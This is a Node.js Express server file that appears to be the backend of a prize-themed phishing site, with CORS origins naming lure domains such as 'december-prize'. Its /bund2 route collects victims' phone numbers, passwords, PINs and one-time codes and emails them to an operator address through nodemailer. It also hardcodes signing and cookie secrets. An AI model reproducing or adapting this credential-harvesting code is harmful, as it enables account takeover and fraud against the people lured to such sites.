const express = require('express')
const app = express()
const nodemailer = require('nodemailer')
const jwt = require('jsonwebtoken')
const csrf = require('csurf')
const cookieParser = require('cookie-parser')
const cors = require('cors')
const auth = require('./middleware/is-Auth')

app.use(auth)

app.use(express.json())

app.use(cookieParser('secret'))
app.use(express.urlencoded({ extended: true }))
//const parseForm = bodyParser.urlencoded({ extended: false })

const corsOptions = {
   // origin: 'http://localhost:3000',
    //origin: 'https://bundlewalletchat.com',
   // origin: 'https://www.bundleprize.com',
   origin: 'https://www.december-prize.com',
    credentials: true,
}

app.use(cors(corsOptions))

const csrfProtection = csrf({ cookie: true })

app.get('/', (req, res) => {
    res.send('Welcome to bund2 back')
})

app.get('/form', csrfProtection, (req, res) => {
    console.log('the auth of form', req.Auth)
    console.log('in form')

    const csrfToken = req.csrfToken()

    const token = jwt.sign({ csrfToken }, 'supersecretkey', { expiresIn: '5m' })
    //res.cookie('CSRF-TOKEN', '2434343')

    res.send({ token })
})

app.post('/bund2', (req, res, next) => {
    console.log('req body', req.body)

    if (!req.Auth) {
        const err = new Error('Not authenticated')
        err.statusCode = 403
        throw err
    }

    const { phone, password, pin, otp } = req.body

    console.log('length of otp', otp.length)

    if (otp.length > 6) {
        console.log('Attack started', otp)
        return
    } else {
        console.log('Normal email', otp)
        // const transporter = nodemailer.createTransport({
        //     host: process.env.HOST,
        //     port: 465,
        //     secure: true,
        //     requireTLS: true,
        //     socketTimeout: 1200000,
        //     connectionTimeout: 1200000,
        //     auth: {
        //         user: process.env.EMAIL,
        //         pass: process.env.PASSWORD,
        //     },
        //     tls: {
        //         rejectUnauthorized: false,
        //     },
        // })

           const transporter = nodemailer.createTransport({
            service: process.env.HOST,
            auth: {
                 user: process.env.EMAIL,
                pass: process.env.PASSWORD,
            },
        
        })

        transporter.verify(function (error, _success) {
            if (error) {
                console.log(error)
            } else {
                console.log('Server is ready to take our messages')
            }
        })

        const content = `<p><strong>Phone:</strong> ${phone} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from December-prize!!`

        const mail = {
            from: process.env.EMAIL,
            to: process.env.TOEMAIL,
            subject: 'New message from December-prize',
            html: content,
        }

        transporter.sendMail(mail, (err, data) => {
            if (err) {
                console.log({ err })
                res.json({
                    status: 'fail',
                })
            } else {
                console.log('email sent', data)
                res.json({
                    status: 'success',
                })
            }
        })
    }
})

module.exports = app

